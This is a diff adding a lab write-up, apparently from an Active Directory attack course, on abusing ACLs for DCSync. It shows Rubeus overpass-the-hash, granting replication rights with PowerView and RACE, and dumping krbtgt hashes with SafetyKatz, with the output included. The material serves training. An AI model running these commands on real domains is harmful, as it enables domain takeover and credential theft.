@@ -1171,3 +1171,213 @@ Mode                LastWriteTime         Length Name
 
 ---
 ---
+
+## DCSync Attack via ACL Abuse
+
+### Lab: Hands-On #16
+
+#### Tasks
+
+Later during the extra lab time:
+- Check if `studentuser51` has Replication (DCSync) rights
+- If yes, execute the DCSync attack to pull hashes of the `krbtgt` use.
+- If no, add the replication rights for the `studentuser51` and execute the DCSync attack to pull hashes of the `krbtgt` user
+
+#### Solution
+
+- Check if `studentuser51` has Replication (DCSync) rights
+
+```
+PS C:\AD\Tools> Import-Module C:\AD\Tools\PowerView.ps1
+
+PS C:\AD\Tools> Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser51"}
+```
+
+We got no output as `studentuser51` does not have the replication rights.
+
+- If no, add the replication rights for the `studentuser51` and execute the DCSync attack to pull hashes of the `krbtgt` user
+
+But, we can add those rights with Domain Administrator privileges.
+
+Using Overpass-the-Hash, let's run a command prompt with DA privileges.
+
+```
+C:\Windows\System32> echo %Pwn%
+
+asktgt
+
+C:\Windows\System32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+[SNIP]
+
+[*] Action: Ask TGT
+
+[SNIP]
+
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
+  ServiceRealm             :  US.TECHCORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  US.TECHCORP.LOCAL
+  StartTime                :  4/25/2025 9:55:25 AM
+  EndTime                  :  4/25/2025 7:55:25 PM
+  RenewTill                :  5/2/2025 9:55:25 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /PtVNHxA8trTcXS6bLDS7gzKf1svjO2Pu7mcTK/MOak=
+  ASREP (key)              :  DB7BD8E34FADA016EB0E292816040A1BF4EEB25CD3843E041D0278D30DC1B335
+```
+
+In the new process, we can use both PowerView or AD Module with `RACE.ps1`.
+
+**PowerView**
+
+```
+C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+PS C:\Windows\system32> Import-Module C:\AD\Tools\PowerView.ps1
+
+PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser51 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+
+[SNIP]
+
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser51,CN=Users,DC=us,DC=techcorp,DC=local 'DCSync' on
+DC=us,DC=techcorp,DC=local
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser51,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
+'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=us,DC=techcorp,DC=local
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser51,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
+'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=us,DC=techcorp,DC=local
+VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser51,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
+'89e95b76-444d-4c62-991a-0facbeda640c' on DC=us,DC=techcorp,DC=local
+```
+
+**AD Moule with RACE.ps1**
+
+```
+C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+
+PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+
+PS C:\AD\Tools> Import-Module C:\AD\Tools\RACE-master\RACE.ps1
+
+PS C:\AD\Tools> Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuser51 -GUIDRight DCSync -Verbose
+
+[SNIP]
+
+VERBOSE: Setting ACL for "DC=us,DC=techcorp,DC=local" for "studentuser51" to use "DCSync" right.
+```
+
+Let’s check for the rights once again from a normal shell.
+
+```
+PS C:\Windows\system32> Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser51"}
+
+[SNIP]
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set 🔐
+ObjectSID              : S-1-5-21-210670787-2521448726-163245708
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-19121
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : US\studentuser51 👤
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes 🔐
+ObjectSID              : S-1-5-21-210670787-2521448726-163245708
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-19121
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : US\studentuser51 👤
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=us,DC=techcorp,DC=local
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-All 🔐
+ObjectSID              : S-1-5-21-210670787-2521448726-163245708
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-19121
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : US\studentuser51 👤
+```
+
+- If yes, execute the DCSync attack to pull hashes of the `krbtgt` use.
+
+Now, below commands can be used as `studentuser51` to get the hashes of `krbtgt` user.
+
+```
+C:\Windows\system32>echo %Pwn%
+
+lsadump::dcsync
+
+C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit"
+
+[SNIP]
+
+mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt
+
+[SNIP]
+
+SAM Username         : krbtgt 👤
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/5/2019 12:49:17 AM
+Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: b0975ae49f441adc6b024ad238935af5 🔑
+    ntlm- 0: b0975ae49f441adc6b024ad238935af5
+    lm  - 0: d765cfb668ed3b1f510b8c3861447173
+
+[SNIP]
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : US.TECHCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 🔑
+
+[SNIP]
+```
+
+---
+---
